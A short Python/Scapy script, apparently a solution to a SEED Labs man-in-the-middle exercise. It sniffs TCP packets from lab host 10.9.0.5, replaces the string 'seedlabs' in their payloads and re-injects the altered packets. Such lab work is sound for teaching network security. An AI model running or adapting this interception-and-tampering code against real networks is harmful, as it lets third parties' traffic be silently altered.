#!/usr/bin/env python3
from scapy.all import *
def spoof_pkt(pkt):
    newpkt = IP(bytes(pkt[IP]))
    del(newpkt.chksum)
    del(newpkt[TCP].payload)
    del(newpkt[TCP].chksum)
    pkt.show()
    if pkt[TCP].payload:
        data = pkt[TCP].payload.load
        print("*** %s, length: %d" % (data, len(data)))
        pkt.show()
        print("end")
        # Replace a pattern
        newdata = data.replace(b'seedlabs', b'AAAAAAAA')
        
        send(newpkt/newdata, verbose=0)
        return
    else:
        send(newpkt, verbose=0)

f = 'tcp and src host 10.9.0.5'
pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)